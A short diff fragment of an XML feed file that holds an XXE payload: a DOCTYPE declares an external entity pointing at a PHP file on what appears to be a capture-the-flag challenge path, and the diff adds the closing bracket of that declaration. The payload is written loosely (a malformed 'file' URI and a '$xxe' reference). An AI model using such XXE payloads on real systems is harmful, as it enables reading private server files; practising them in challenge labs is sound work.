@@ -4,6 +4,7 @@
   <!ELEMENT foo ANY>
   <!ENTITY xxe SYSTEM "file///challenge/web-serveur/ch29/index.php">
   ]
+>
   <foo>$xxe</foo>
 <channel>
   <title>W3Schools Home Page</title>
